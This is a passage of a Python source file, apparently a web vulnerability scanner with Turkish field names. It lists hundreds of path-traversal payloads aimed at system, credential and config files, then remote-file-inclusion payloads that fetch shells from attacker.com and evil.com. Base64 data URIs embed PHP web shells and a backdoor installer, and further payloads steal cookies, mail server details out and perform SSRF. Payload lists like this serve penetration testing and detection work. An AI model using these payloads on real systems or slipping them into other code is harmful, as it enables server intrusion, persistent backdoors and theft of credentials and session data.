                {"payload": "../../../etc/vsftpd/vsftpd.conf", "guven": 0.82, "aciklama": "VSFTPD detailed config"},
                {"payload": "../../../etc/proftpd/proftpd.conf", "guven": 0.81, "aciklama": "ProFTPD config"},
                {"payload": "../../../etc/pure-ftpd/pure-ftpd.conf", "guven": 0.80, "aciklama": "Pure-FTPd config"},
                {"payload": "../../../var/log/vsftpd.log", "guven": 0.79, "aciklama": "VSFTPD access log"},
                {"payload": "../../../var/log/proftpd/proftpd.log", "guven": 0.78, "aciklama": "ProFTPD log"},
                {"payload": "../../../var/log/xferlog", "guven": 0.83, "aciklama": "FTP transfer log"},
                {"payload": "../../../etc/ftpusers", "guven": 0.77, "aciklama": "FTP denied users"},
                {"payload": "../../../etc/ftpchroot", "guven": 0.76, "aciklama": "FTP chroot users"},
                {"payload": "../../../var/ftp/welcome.msg", "guven": 0.74, "aciklama": "FTP welcome message"},
                {"payload": "../../../etc/wu-ftpd/ftpaccess", "guven": 0.75, "aciklama": "Wu-FTPd access config"},

                # 441-450: DNS Server Configs
                {"payload": "../../../etc/bind/named.conf", "guven": 0.85, "aciklama": "BIND DNS main config"},
                {"payload": "../../../etc/named.conf", "guven": 0.84, "aciklama": "Named configuration"},
                {"payload": "../../../var/named/named.ca", "guven": 0.81, "aciklama": "DNS root hints"},
                {"payload": "../../../etc/bind/db.local", "guven": 0.80, "aciklama": "Local DNS zone"},
                {"payload": "../../../var/log/named/named.log", "guven": 0.82, "aciklama": "DNS server log"},
                {"payload": "../../../etc/unbound/unbound.conf", "guven": 0.79, "aciklama": "Unbound DNS config"},
                {"payload": "../../../etc/dnsmasq.conf", "guven": 0.83, "aciklama": "Dnsmasq config"},
                {"payload": "../../../var/log/dnsmasq.log", "guven": 0.78, "aciklama": "Dnsmasq log"},
                {"payload": "../../../etc/powerdns/pdns.conf", "guven": 0.77, "aciklama": "PowerDNS config"},
                {"payload": "../../../var/log/pdns.log", "guven": 0.76, "aciklama": "PowerDNS log"},

                # 451-460: LDAP and Directory Services
                {"payload": "../../../etc/openldap/slapd.conf", "guven": 0.86, "aciklama": "OpenLDAP server config"},
                {"payload": "../../../etc/ldap/ldap.conf", "guven": 0.85, "aciklama": "LDAP client config"},
                {"payload": "../../../var/log/slapd.log", "guven": 0.84, "aciklama": "SLAPD server log"},
                {"payload": "../../../etc/nsswitch.conf", "guven": 0.87, "aciklama": "Name service switch"},
                {"payload": "../../../etc/pam.conf", "guven": 0.88, "aciklama": "PAM configuration"},
                {"payload": "../../../etc/pam.d/common-auth", "guven": 0.83, "aciklama": "PAM common auth"},
                {"payload": "../../../etc/pam.d/sshd", "guven": 0.82, "aciklama": "PAM SSH config"},
                {"payload": "../../../etc/krb5.conf", "guven": 0.81, "aciklama": "Kerberos config"},
                {"payload": "../../../var/log/krb5.log", "guven": 0.80, "aciklama": "Kerberos log"},
                {"payload": "../../../etc/samba/smb.conf", "guven": 0.84, "aciklama": "Samba config"},

                # 461-470: Firewall and Security
                {"payload": "../../../etc/iptables/rules.v4", "guven": 0.88, "aciklama": "IPv4 iptables rules"},
                {"payload": "../../../etc/iptables/rules.v6", "guven": 0.87, "aciklama": "IPv6 iptables rules"},
                {"payload": "../../../etc/sysconfig/iptables", "guven": 0.86, "aciklama": "System iptables config"},
                {"payload": "../../../etc/ufw/before.rules", "guven": 0.85, "aciklama": "UFW before rules"},
                {"payload": "../../../etc/ufw/after.rules", "guven": 0.84, "aciklama": "UFW after rules"},
                {"payload": "../../../etc/fail2ban/jail.conf", "guven": 0.89, "aciklama": "Fail2ban jail config"},
                {"payload": "../../../var/log/fail2ban.log", "guven": 0.83, "aciklama": "Fail2ban log"},
                {"payload": "../../../etc/hosts.allow", "guven": 0.82, "aciklama": "TCP wrappers allow"},
                {"payload": "../../../etc/hosts.deny", "guven": 0.81, "aciklama": "TCP wrappers deny"},
                {"payload": "../../../etc/selinux/config", "guven": 0.80, "aciklama": "SELinux configuration"},

                # 471-480: System Service Configs
                {"payload": "../../../etc/systemd/system.conf", "guven": 0.83, "aciklama": "Systemd main config"},
                {"payload": "../../../etc/systemd/user.conf", "guven": 0.82, "aciklama": "Systemd user config"},
                {"payload": "../../../etc/init.d/*", "guven": 0.81, "aciklama": "Init scripts"},
                {"payload": "../../../etc/rc.local", "guven": 0.84, "aciklama": "Local startup script"},
                {"payload": "../../../etc/inittab", "guven": 0.80, "aciklama": "Init configuration"},
                {"payload": "../../../etc/upstart/*.conf", "guven": 0.79, "aciklama": "Upstart job configs"},
                {"payload": "../../../var/log/upstart/*", "guven": 0.78, "aciklama": "Upstart job logs"},
                {"payload": "../../../etc/supervisor/supervisord.conf", "guven": 0.82, "aciklama": "Supervisor config"},
                {"payload": "../../../var/log/supervisor/supervisord.log", "guven": 0.77, "aciklama": "Supervisor log"},
                {"payload": "../../../etc/logrotate.conf", "guven": 0.81, "aciklama": "Log rotation config"},

                # 481-490: Advanced System Files
                {"payload": "../../../proc/sys/kernel/hostname", "guven": 0.76, "aciklama": "Kernel hostname"},
                {"payload": "../../../proc/sys/kernel/version", "guven": 0.75, "aciklama": "Kernel version proc"},
                {"payload": "../../../proc/sys/kernel/osrelease", "guven": 0.74, "aciklama": "OS release proc"},
                {"payload": "../../../proc/sys/net/ipv4/ip_forward", "guven": 0.78, "aciklama": "IP forwarding status"},
                {"payload": "../../../proc/net/dev", "guven": 0.82, "aciklama": "Network device stats"},
                {"payload": "../../../proc/diskstats", "guven": 0.77, "aciklama": "Disk I/O statistics"},
                {"payload": "../../../proc/swaps", "guven": 0.76, "aciklama": "Swap usage info"},
                {"payload": "../../../proc/vmstat", "guven": 0.75, "aciklama": "Virtual memory stats"},
                {"payload": "../../../proc/interrupts", "guven": 0.74, "aciklama": "System interrupts"},
                {"payload": "../../../proc/iomem", "guven": 0.73, "aciklama": "I/O memory map"},

                # 491-500: Final Advanced Patterns
                {"payload": "....//....//....//....//....//....//....//....//etc/passwd", "guven": 0.72, "aciklama": "Ultra deep double slash"},
                {"payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "guven": 0.71, "aciklama": "Leading slash + encoding"},
                {"payload": "\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd", "guven": 0.70, "aciklama": "Backslash only traversal"},
                {"payload": "../../../etc/passwd%00%01%02%03", "guven": 0.69, "aciklama": "Multiple null bytes"},
                {"payload": "../../../etc/passwd%ff%fe%fd", "guven": 0.68, "aciklama": "High byte injection"},
                {"payload": "php://filter/read=convert.base64-encode|convert.base64-decode|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.85, "aciklama": "Triple filter chain"},
                {"payload": "file:///../../../etc/passwd", "guven": 0.83, "aciklama": "File protocol traversal"},
                {"payload": "php://filter/zlib.deflate|zlib.inflate|convert.base64-encode/resource=../../../etc/passwd", "guven": 0.82, "aciklama": "Compression cycle filter"},
                {"payload": "../../../etc/passwd" + "?" + "A" * 2000, "guven": 0.67, "aciklama": "Query overflow"},
                {"payload": "data://text/plain;base64," + "Li4vLi4vLi4vZXRjL3Bhc3N3ZA==" * 10, "guven": 0.66, "aciklama": "Repeated data payload"}
            ],
            
            ZafiyetTipi.RFI: [
    # Temel RFI Payloadları (1-20)
    {"payload": "http://attacker.com/shell.txt", "guven": 0.95, "aciklama": "HTTP uzaktan dosya"},
    {"payload": "https://pastebin.com/raw/malicious", "guven": 0.9, "aciklama": "HTTPS uzaktan içerik"},
    {"payload": "ftp://attacker.com/shell.php", "guven": 0.85, "aciklama": "FTP uzaktan dosya"},
    {"payload": "http://evil.com/malicious.php", "guven": 0.9, "aciklama": "Zararlı PHP dosyası"},
    {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "guven": 0.85, "aciklama": "Data URI XSS"},
    {"payload": "http://127.0.0.1/evil", "guven": 0.7, "aciklama": "Localhost bypass"},
    {"payload": "file:///etc/passwd", "guven": 0.8, "aciklama": "File protokolü"},
    {"payload": "php://filter/read=convert.base64-encode/resource=index.php", "guven": 0.9, "aciklama": "PHP wrapper"},
    {"payload": "https://attacker.com/backdoor.txt", "guven": 0.95, "aciklama": "HTTPS backdoor"},
    {"payload": "http://evil.org/shell.txt", "guven": 0.9, "aciklama": "Alternatif domain shell"},
    {"payload": "https://raw.githubusercontent.com/user/repo/main/shell.txt", "guven": 0.85, "aciklama": "GitHub raw dosya"},
    {"payload": "http://bit.ly/evilshell", "guven": 0.8, "aciklama": "URL shortener bypass"},
    {"payload": "http://192.168.1.100/shell.php", "guven": 0.85, "aciklama": "IP adres tabanlı RFI"},
    {"payload": "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "guven": 0.9, "aciklama": "Base64 PHP shell"},
    {"payload": "php://input", "guven": 0.85, "aciklama": "PHP input stream"},
    {"payload": "php://filter/resource=http://attacker.com/shell.txt", "guven": 0.9, "aciklama": "PHP filter wrapper"},
    {"payload": "http://[::1]/malicious.php", "guven": 0.75, "aciklama": "IPv6 localhost bypass"},
    {"payload": "https://cdn.jsdelivr.net/gh/user/repo@main/shell.txt", "guven": 0.8, "aciklama": "JSDelivr CDN bypass"},
    {"payload": "http://www.google.com/url?q=http://attacker.com/shell.txt", "guven": 0.85, "aciklama": "Google redirect bypass"},
    {"payload": "data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==", "guven": 0.9, "aciklama": "Data protocol eval"},

    # Gelişmiş PHP Wrapper Teknikleri (21-50)
    {"payload": "php://filter/convert.base64-encode/resource=http://attacker.com/shell.php", "guven": 0.92, "aciklama": "Base64 encode wrapper"},
    {"payload": "php://filter/string.rot13/resource=http://attacker.com/encoded.php", "guven": 0.88, "aciklama": "ROT13 encode wrapper"},
    {"payload": "php://filter/convert.iconv.utf-8.utf-16/resource=http://evil.com/shell.txt", "guven": 0.87, "aciklama": "Iconv encoding bypass"},
    {"payload": "php://filter/zlib.deflate/resource=http://attacker.com/compressed.php", "guven": 0.85, "aciklama": "Zlib compression wrapper"},
    {"payload": "php://filter/string.toupper/resource=http://evil.org/lowercase.php", "guven": 0.83, "aciklama": "String transformation"},
    {"payload": "php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7", "guven": 0.91, "aciklama": "Nested encoding"},
    {"payload": "php://filter/read=string.strip_tags/resource=http://attacker.com/tagged.php", "guven": 0.84, "aciklama": "Strip tags filter"},
    {"payload": "php://filter/write=string.rot13/resource=http://evil.com/output.php", "guven": 0.86, "aciklama": "Write filter chain"},
    {"payload": "php://filter/convert.quoted-printable-encode/resource=http://attacker.com/qp.php", "guven": 0.82, "aciklama": "Quoted printable encoding"},
    {"payload": "php://filter/convert.iconv.utf-8.utf-7/resource=http://evil.org/utf7.php", "guven": 0.89, "aciklama": "UTF-7 encoding bypass"},
    {"payload": "php://filter/string.tolower|convert.base64-encode/resource=http://attacker.com/mixed.php", "guven": 0.90, "aciklama": "Multiple filter chain"},
    {"payload": "php://filter/dechunk/resource=http://evil.com/chunked.php", "guven": 0.81, "aciklama": "Dechunk filter"},
    {"payload": "php://filter/convert.base64-encode|convert.base64-decode/resource=http://attacker.com/double.php", "guven": 0.88, "aciklama": "Double encoding"},
    {"payload": "php://filter/zlib.inflate/resource=http://evil.org/deflated.php", "guven": 0.85, "aciklama": "Zlib inflate"},
    {"payload": "php://filter/string.strip_tags|string.tolower/resource=http://attacker.com/complex.php", "guven": 0.87, "aciklama": "Complex filter chain"},
    {"payload": "php://filter/convert.iconv.ISO-8859-1.UTF-8/resource=http://evil.com/iso.php", "guven": 0.83, "aciklama": "ISO encoding conversion"},
    {"payload": "php://filter/bzip2.compress/resource=http://attacker.com/bzip.php", "guven": 0.82, "aciklama": "Bzip2 compression"},
    {"payload": "php://filter/bzip2.decompress/resource=http://evil.org/compressed.bz2", "guven": 0.84, "aciklama": "Bzip2 decompression"},
    {"payload": "php://filter/convert.base64-encode/write=string.rot13/resource=http://attacker.com/complex2.php", "guven": 0.89, "aciklama": "Read/write filter mix"},
    {"payload": "php://filter/string.toupper|string.tolower|convert.base64-encode/resource=http://evil.com/triple.php", "guven": 0.86, "aciklama": "Triple filter chain"},
    {"payload": "php://filter/convert.iconv.UTF-8.UTF-16BE/resource=http://attacker.com/utf16.php", "guven": 0.85, "aciklama": "UTF-16BE encoding"},
    {"payload": "php://filter/convert.iconv.UTF-8.UTF-32/resource=http://evil.org/utf32.php", "guven": 0.84, "aciklama": "UTF-32 encoding"},
    {"payload": "php://filter/string.strip_tags|convert.quoted-printable-encode/resource=http://attacker.com/qp2.php", "guven": 0.83, "aciklama": "Strip and encode"},
    {"payload": "php://filter/zlib.deflate|convert.base64-encode/resource=http://evil.com/compressed64.php", "guven": 0.88, "aciklama": "Compress and encode"},
    {"payload": "php://filter/convert.base64-decode|zlib.inflate/resource=data://text/plain;base64,eJwLycxLVSguTU4sSk4sSU3OTFHILFZIzsjMS1dIzCvJzE21UshIzStJLS5JzU1VyC9KSS0CAJHaGJk=", "guven": 0.92, "aciklama": "Complex nested filter"},
    {"payload": "php://filter/string.rot13|string.tolower|convert.base64-encode/resource=http://attacker.com/rot13lower64.php", "guven": 0.87, "aciklama": "ROT13, lowercase, base64"},
    {"payload": "php://filter/convert.iconv.UTF-8.EBCDIC-CP-BE/resource=http://evil.org/ebcdic.php", "guven": 0.81, "aciklama": "EBCDIC encoding"},
    {"payload": "php://filter/convert.iconv.UTF-8.HZ/resource=http://attacker.com/hz.php", "guven": 0.80, "aciklama": "HZ encoding"},
    {"payload": "php://filter/convert.iconv.UTF-8.ISO-2022-CN/resource=http://evil.com/iso2022.php", "guven": 0.82, "aciklama": "ISO-2022-CN encoding"},
    {"payload": "php://filter/string.toupper|convert.iconv.UTF-8.UTF-7/resource=http://attacker.com/upperutf7.php", "guven": 0.85, "aciklama": "Uppercase UTF-7"},

    # URL Encoding ve Obfuscation (51-80)
    {"payload": "http://attacker.com/shell.php%00", "guven": 0.88, "aciklama": "Null byte injection"},
    {"payload": "http://attacker.com/shell.php%00.txt", "guven": 0.87, "aciklama": "Null byte extension bypass"},
    {"payload": "http://attacker.com/shell.php%2500", "guven": 0.86, "aciklama": "Double URL encoded null"},
    {"payload": "http://attacker.com/shell.php%252500", "guven": 0.85, "aciklama": "Triple URL encoded null"},
    {"payload": "http://%61%74%74%61%63%6b%65%72.%63%6f%6d/shell.php", "guven": 0.84, "aciklama": "Full URL encoding"},
    {"payload": "http://attacker.com/%2e%2e%2fshell.php", "guven": 0.83, "aciklama": "URL encoded path traversal"},
    {"payload": "http://attacker.com/shell.php%3f", "guven": 0.82, "aciklama": "URL encoded question mark"},
    {"payload": "http://attacker.com/shell.php%23", "guven": 0.81, "aciklama": "URL encoded hash"},
    {"payload": "http://attacker.com/shell.php%26", "guven": 0.80, "aciklama": "URL encoded ampersand"},
    {"payload": "hTTp://AtTaCkEr.CoM/sHeLL.pHp", "guven": 0.79, "aciklama": "Mixed case protocol"},
    {"payload": "HTTP://ATTACKER.COM/SHELL.PHP", "guven": 0.78, "aciklama": "Uppercase protocol"},
    {"payload": "http://attacker.com:80/shell.php", "guven": 0.88, "aciklama": "Explicit port 80"},
    {"payload": "https://attacker.com:443/shell.php", "guven": 0.89, "aciklama": "Explicit port 443"},
    {"payload": "http://attacker.com:8080/shell.php", "guven": 0.87, "aciklama": "Alternative port"},
    {"payload": "http://attacker.com./shell.php", "guven": 0.86, "aciklama": "Trailing dot domain"},
    {"payload": "http://attacker.com../shell.php", "guven": 0.85, "aciklama": "Double trailing dot"},
    {"payload": "http://attacker.com/./shell.php", "guven": 0.84, "aciklama": "Current directory"},
    {"payload": "http://attacker.com//shell.php", "guven": 0.83, "aciklama": "Double slash"},
    {"payload": "http://attacker.com///shell.php", "guven": 0.82, "aciklama": "Triple slash"},
    {"payload": "http://attacker.com/shell.php/", "guven": 0.81, "aciklama": "Trailing slash"},
    {"payload": "http://attacker.com/shell.php//", "guven": 0.80, "aciklama": "Double trailing slash"},
    {"payload": "http://attacker.com:80:80/shell.php", "guven": 0.79, "aciklama": "Double port specification"},
    {"payload": "http://attacker.com\\.com/shell.php", "guven": 0.78, "aciklama": "Backslash in domain"},
    {"payload": "http://attacker.com%2Fshell.php", "guven": 0.85, "aciklama": "URL encoded slash"},
    {"payload": "http://attacker.com%5Cshell.php", "guven": 0.84, "aciklama": "URL encoded backslash"},
    {"payload": "http://attacker.com%09shell.php", "guven": 0.83, "aciklama": "URL encoded tab"},
    {"payload": "http://attacker.com%0Ashell.php", "guven": 0.82, "aciklama": "URL encoded newline"},
    {"payload": "http://attacker.com%0Dshell.php", "guven": 0.81, "aciklama": "URL encoded carriage return"},
    {"payload": "http://attacker.com%20shell.php", "guven": 0.80, "aciklama": "URL encoded space"},
    {"payload": "http://attacker%2Ecom/shell.php", "guven": 0.87, "aciklama": "URL encoded dot in domain"},

    # IP Address Obfuscation (81-110)
    {"payload": "http://2130706433/shell.php", "guven": 0.86, "aciklama": "Decimal IP (127.0.0.1)"},
    {"payload": "http://0x7f000001/shell.php", "guven": 0.85, "aciklama": "Hexadecimal IP"},
    {"payload": "http://0177.0.0.1/shell.php", "guven": 0.84, "aciklama": "Octal IP"},
    {"payload": "http://127.1/shell.php", "guven": 0.83, "aciklama": "Short IP notation"},
    {"payload": "http://127.0.1/shell.php", "guven": 0.82, "aciklama": "Shorter IP notation"},
    {"payload": "http://0x7f.0x0.0x0.0x1/shell.php", "guven": 0.85, "aciklama": "Mixed hex IP"},
    {"payload": "http://0177.0.0.01/shell.php", "guven": 0.84, "aciklama": "Mixed octal IP"},
    {"payload": "http://[::ffff:127.0.0.1]/shell.php", "guven": 0.88, "aciklama": "IPv4-mapped IPv6"},
    {"payload": "http://[::ffff:7f00:1]/shell.php", "guven": 0.87, "aciklama": "IPv4-mapped IPv6 hex"},
    {"payload": "http://[::1]/shell.php", "guven": 0.86, "aciklama": "IPv6 localhost"},
    {"payload": "http://[0:0:0:0:0:0:0:1]/shell.php", "guven": 0.85, "aciklama": "Full IPv6 localhost"},
    {"payload": "http://192.168.0.1.xip.io/shell.php", "guven": 0.84, "aciklama": "xip.io wildcard DNS"},
    {"payload": "http://192.168.0.1.nip.io/shell.php", "guven": 0.83, "aciklama": "nip.io wildcard DNS"},
    {"payload": "http://192.168.0.1.sslip.io/shell.php", "guven": 0.82, "aciklama": "sslip.io wildcard DNS"},
    {"payload": "http://localtest.me/shell.php", "guven": 0.81, "aciklama": "localtest.me points to 127.0.0.1"},
    {"payload": "http://lvh.me/shell.php", "guven": 0.80, "aciklama": "lvh.me points to 127.0.0.1"},
    {"payload": "http://127.0.0.1.nip.io/shell.php", "guven": 0.85, "aciklama": "Localhost via nip.io"},
    {"payload": "http://0/shell.php", "guven": 0.84, "aciklama": "Zero IP address"},
    {"payload": "http://0.0.0.0/shell.php", "guven": 0.83, "aciklama": "Zero IP full"},
    {"payload": "http://[::]/shell.php", "guven": 0.82, "aciklama": "IPv6 zero address"},
    {"payload": "http://017700000001/shell.php", "guven": 0.86, "aciklama": "Full octal IP"},
    {"payload": "http://0x7f000001/shell.php", "guven": 0.85, "aciklama": "Full hex IP"},
    {"payload": "http://2130706433.0/shell.php", "guven": 0.84, "aciklama": "Decimal IP with zero"},
    {"payload": "http://127.000.000.001/shell.php", "guven": 0.83, "aciklama": "Leading zeros IP"},
    {"payload": "http://127.0.0.1:80../shell.php", "guven": 0.82, "aciklama": "Port with path traversal"},
    {"payload": "http://127.0.0.1#/shell.php", "guven": 0.81, "aciklama": "Fragment bypass"},
    {"payload": "http://127.0.0.1?/shell.php", "guven": 0.80, "aciklama": "Query bypass"},
    {"payload": "http://127.0.0.1@attacker.com/shell.php", "guven": 0.87, "aciklama": "Userinfo bypass"},
    {"payload": "http://user:pass@127.0.0.1/shell.php", "guven": 0.86, "aciklama": "Authentication bypass"},
    {"payload": "http://127.0.0.1/shell.php#fragment", "guven": 0.85, "aciklama": "Fragment addition"},

    # Data URI Advanced (111-140)
    {"payload": "data:text/php;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "guven": 0.91, "aciklama": "PHP MIME type data URI"},
    {"payload": "data:application/x-php;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7ID8+", "guven": 0.90, "aciklama": "Alternative PHP MIME"},
    {"payload": "data:,<?php system($_GET['cmd']); ?>", "guven": 0.89, "aciklama": "Plain data URI"},
    {"payload": "data:;base64,PD9waHAgZXhlYygkX0dFVFsnY21kJ10pOyA/Pg==", "guven": 0.88, "aciklama": "No MIME type data URI"},
    {"payload": "data:text/plain;charset=utf-8;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTsgPz4=", "guven": 0.87, "aciklama": "UTF-8 charset data URI"},
    {"payload": "data:text/html;charset=iso-8859-1;base64,PD9waHAgc2hlbGxfZXhlYygkX0dFVFsnY21kJ10pOyA/Pg==", "guven": 0.86, "aciklama": "ISO-8859-1 data URI"},
    {"payload": "data:text/x-php;base64,PD9waHAgYGVjaG8gJF9HRVRbJ2NtZCddYDsgPz4=", "guven": 0.85, "aciklama": "x-php MIME type"},
    {"payload": "data:application/php;base64,PD9waHAgcHJpbnQgYCRfR0VUWydjbWQnXWA7ID8+", "guven": 0.84, "aciklama": "Application PHP MIME"},
    {"payload": "data:text/plain;filename=shell.php;base64,PD9waHAgZmlsZV9nZXRfY29udGVudHMoJF9HRVRbJ2ZpbGUnXSk7ID8+", "guven": 0.83, "aciklama": "Filename parameter"},
    {"payload": "data:text/php,<?php echo file_get_contents('/etc/passwd'); ?>", "guven": 0.88, "aciklama": "Direct PHP data URI"},
    {"payload": "data:text/plain;base64,PD9waHAKZWNobyAiPHByZT4iOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoaXNzZXQoJGNtZCkpIHsKICAgICRvdXRwdXQgPSBzaGVsbF9leGVjKCRjbWQpOwogICAgZWNobyAkb3V0cHV0Owp9CmVjaG8gIjwvcHJlPiI7Cj8+", "guven": 0.92, "aciklama": "Complex PHP shell"},
    {"payload": "data:text/html,<script>document.write('<iframe src=\"http://attacker.com/shell.php\"></iframe>')</script>", "guven": 0.85, "aciklama": "JavaScript iframe injection"},
    {"payload": "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikiPjwvc3ZnPg==", "guven": 0.84, "aciklama": "SVG XSS data URI"},
    {"payload": "data:text/javascript,eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))", "guven": 0.83, "aciklama": "JavaScript eval data URI"},
    {"payload": "data:application/javascript,alert(document.domain)", "guven": 0.82, "aciklama": "Application JavaScript"},
    {"payload": "data:text/vbscript,MsgBox(\"XSS\")", "guven": 0.81, "aciklama": "VBScript data URI"},
    {"payload": "data:text/x-python;base64,aW1wb3J0IG9zCm9zLnN5c3RlbSgiZWNobyBoYWNrZWQiKQ==", "guven": 0.80, "aciklama": "Python data URI"},
    {"payload": "data:text/x-perl;base64,c3lzdGVtKCJlY2hvIGhhY2tlZCIpOw==", "guven": 0.79, "aciklama": "Perl data URI"},
    {"payload": "data:text/x-ruby;base64,c3lzdGVtKCJlY2hvIGhhY2tlZCIp", "guven": 0.78, "aciklama": "Ruby data URI"},
    {"payload": "data:text/x-shell;base64,ZWNobyBoYWNrZWQ=", "guven": 0.77, "aciklama": "Shell script data URI"},
    {"payload": "data:text/plain;name=shell.php;base64,PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2JhY2tkb29yLnBocCcsICc8P3BocCBzeXN0ZW0oJF9HRVRbXCJjbWRcIl0pOyA/PicpOyA/Pg==", "guven": 0.88, "aciklama": "File creation data URI"},
    {"payload": "data:text/php;charset=utf-16;base64,PAA/AHAAaABwACAAcwB5AHMAdABlAG0AKAAkAF8ARwBFAFQAWwAnAGMAbQBkACcAXQApADsAIAA/AD4A", "guven": 0.87, "aciklama": "UTF-16 PHP shell"},
    {"payload": "data:text/php;charset=utf-32;base64,PAAAAAAvAAAAcAAAAGgAAABwAAAAIAAAAHMAAAB5AAAAcwAAAHQAAABlAAAAbQAAACgAAAAkAAAAXwAAAEcAAABFAAAAVAAAAFsAAAAnAAAAYwAAAG0AAABkAAAAJwAAAF0AAAApAAAAOwAAACAAAAA/AAAAPQAAAA==", "guven": 0.86, "aciklama": "UTF-32 PHP shell"},
    {"payload": "data:text/plain;boundary=--boundary;base64,LS1ib3VuZGFyeQpDb250ZW50LVR5cGU6IHRleHQvcGhwCgo8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4KLS1ib3VuZGFyeS0t", "guven": 0.85, "aciklama": "Multipart data URI"},
    {"payload": "data:text/php,<?php echo \"<script>location.href='http://attacker.com/steal.php?cookie=\".document.cookie</script>\"; ?>", "guven": 0.89, "aciklama": "Cookie stealing PHP"},
    {"payload": "data:text/php;base64,PD9waHAgZXJyb3JfcmVwb3J0aW5nKDApOyBzZXNzaW9uX3N0YXJ0KCk7IGVjaG8gIjx0aXRsZT5TaGVsbDwvdGl0bGU+IjsgaWYoaXNzZXQoJF9QT1NUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7IGVjaG8gc2hlbGxfZXhlYygkX1BPU1RbJ2NtZCddKTsgZWNobyAiPC9wcmU+Ijt9IGVjaG8gJzxmb3JtIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiPjwvZm9ybT4nOyA/Pg==", "guven": 0.93, "aciklama": "Full web shell"},
    {"payload": "data:text/php,<?php if(isset($_GET['url'])) { echo file_get_contents($_GET['url']); } ?>", "guven": 0.86, "aciklama": "SSRF PHP payload"},
    {"payload": "data:text/php,<?php header('Location: http://attacker.com/log.php?ref='.urlencode($_SERVER['HTTP_REFERER'])); ?>", "guven": 0.84, "aciklama": "Redirect with referrer"},
    {"payload": "data:text/php,<?php mail('attacker@evil.com', 'Server Info', phpinfo()); ?>", "guven": 0.82, "aciklama": "Email server info"},
    {"payload": "data:text/php,<?php file_put_contents('backdoor.php', base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+')); ?>", "guven": 0.90, "aciklama": "Backdoor installation"},

    # Advanced Protocol Bypasses (141-170)
    {"payload": "jar:http://attacker.com/evil.jar!/malicious.php", "guven": 0.85, "aciklama": "JAR protocol"},
    {"payload": "jar:file:///tmp/evil.jar!/shell.php", "guven": 0.84, "aciklama": "Local JAR file"},
    {"payload": "gopher://attacker.com:70/shell.php", "guven": 0.83, "aciklama": "Gopher protocol"},
    {"payload": "dict://attacker.com:2628/shell.php", "guven": 0.82, "aciklama": "Dict protocol"},
    {"payload": "ldap://attacker.com/shell.php", "guven": 0.81, "aciklama": "LDAP protocol"},
    {"payload": "ldaps://attacker.com/shell.php", "guven": 0.80, "aciklama": "LDAPS protocol"},
    {"payload": "sftp://attacker.com/shell.php", "guven": 0.85, "aciklama": "SFTP protocol"},
    {"payload": "scp://attacker.com/shell.php", "guven": 0.84, "aciklama": "SCP protocol"},
    {"payload": "tftp://attacker.com/shell.php", "guven": 0.83, "aciklama": "TFTP protocol"},
    {"payload": "smb://attacker.com/share/shell.php", "guven": 0.86, "aciklama": "SMB protocol"},
    {"payload": "nfs://attacker.com/export/shell.php", "guven": 0.85, "aciklama": "NFS protocol"},
    {"payload": "rsync://attacker.com/shell.php", "guven": 0.84, "aciklama": "Rsync protocol"},
    {"payload": "git://attacker.com/repo.git/shell.php", "guven": 0.83, "aciklama": "Git protocol"},
    {"payload": "svn://attacker.com/repo/shell.php", "guven": 0.82, "aciklama": "SVN protocol"},
    {"payload": "cvs://attacker.com/repo/shell.php", "guven": 0.81, "aciklama": "CVS protocol"},
    {"payload": "bzr://attacker.com/repo/shell.php", "guven": 0.80, "aciklama": "Bazaar protocol"},
    {"payload": "hg://attacker.com/repo/shell.php", "guven": 0.79, "aciklama": "Mercurial protocol"},
    {"payload": "ssh://attacker.com/shell.php", "guven": 0.87, "aciklama": "SSH protocol"},
    {"payload": "telnet://attacker.com/shell.php", "guven": 0.78, "aciklama": "Telnet protocol"},
    {"payload": "rsh://attacker.com/shell.php", "guven": 0.77, "aciklama": "RSH protocol"},
    {"payload": "rlogin://attacker.com/shell.php", "guven": 0.76, "aciklama": "Rlogin protocol"},
    {"payload": "finger://attacker.com/shell.php", "guven": 0.75, "aciklama": "Finger protocol"},
    {"payload": "news://attacker.com/shell.php", "guven": 0.74, "aciklama": "News protocol"},
    {"payload": "nntp://attacker.com/shell.php", "guven": 0.73, "aciklama": "NNTP protocol"},
    {"payload": "imap://attacker.com/shell.php", "guven": 0.82, "aciklama": "IMAP protocol"},
    {"payload": "imaps://attacker.com/shell.php", "guven": 0.81, "aciklama": "IMAPS protocol"},
    {"payload": "pop3://attacker.com/shell.php", "guven": 0.80, "aciklama": "POP3 protocol"},
    {"payload": "pop3s://attacker.com/shell.php", "guven": 0.79, "aciklama": "POP3S protocol"},
    {"payload": "smtp://attacker.com/shell.php", "guven": 0.83, "aciklama": "SMTP protocol"},
    {"payload": "smtps://attacker.com/shell.php", "guven": 0.82, "aciklama": "SMTPS protocol"},
    {"payload": "rtsp://attacker.com/shell.php", "guven": 0.78, "aciklama": "RTSP protocol"},
    {"payload": "rtmp://attacker.com/shell.php", "guven": 0.77, "aciklama": "RTMP protocol"},
    {"payload": "mms://attacker.com/shell.php", "guven": 0.76, "aciklama": "MMS protocol"},

    # Domain Fronting ve CDN Bypass (171-200)
